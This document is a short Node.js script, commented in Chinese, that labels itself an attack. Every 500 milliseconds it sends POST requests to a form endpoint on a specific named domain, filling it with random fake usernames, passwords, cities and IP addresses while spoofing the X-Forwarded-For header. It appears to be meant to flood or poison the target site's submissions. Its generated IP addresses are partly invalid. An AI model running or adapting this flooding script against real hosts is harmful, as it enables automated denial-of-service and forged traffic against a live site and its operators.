// express
const express = require('express');
// axios
const axios = require('axios');
// app
const app = express();
// 地址
const addressArr = ['北京市', '天津市', '辽宁省沈阳市', '吉林省长春市', '黑龙江省哈尔滨市', '上海市', '江苏省南京市', '湖北省武汉市', '广东省广州市', '重庆市', '四川省成都市', '陕西省西安市'];
const addressLen = addressArr.length;
const address = addressArr[Math.round(Math.random() * (addressLen - 1))];
// ip
const ip = `${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}.${Math.round(Math.random() * 999)}`;
// 用户名
const username = Math.round(Math.random() * 9999999999);
// 密码
const password = Math.round(Math.random() * 9999999999);

function getClientIp(req) {
    return req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        req.connection.socket.remoteAddress;
}

// 进攻
setInterval(function () {
    axios({
        url: 'http://www.dnf-me.cn/in.asp?action=add',
        method: 'post',
        headers: {
            'x-forwarded-for': ip,
        },
        connection: {
            remoteAddress: `${ip}:80`,
        },
        data: {
            dede_fields: 'u,text;p,text',
            dede_fieldshash: ['d1WEGXsPu8CFufla1kRw8W8kW3QA2TG'.split('').sort(() => Math.random() - 0.5).join(''), 'd1WEGXsPu8CFufla1kRw8W8kW3QA2TG'][Math.round(Math.random())],
            ipku: address,
            ip: ip,
            j_dh: username,
            j_xm: password,
        },
    }).then(function (json) {
        // console.log(json);
        console.log('attack');
        // console.log(getClientIp(json.headers.request));
    });
}, 500);
// 监听进程
app.listen('6661');
